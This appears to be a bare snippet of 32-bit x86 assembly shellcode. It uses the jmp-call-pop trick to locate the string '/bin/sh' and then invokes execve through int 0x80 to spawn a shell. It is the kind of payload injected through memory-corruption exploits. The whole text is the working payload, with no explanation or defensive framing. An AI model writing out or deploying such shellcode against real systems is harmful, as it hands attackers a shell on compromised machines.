jmp _want_bin_bash
_got_bin_bash:
xor eax, eax
add eax, 0x0B
pop ebx

lea ecx, [ebx+7]
xor edx, edx
mov [ecx], dl

xor ecx, ecx
int 0x80

_want_bin_bash:
call _got_bin_bash
.string "/bin/sh"
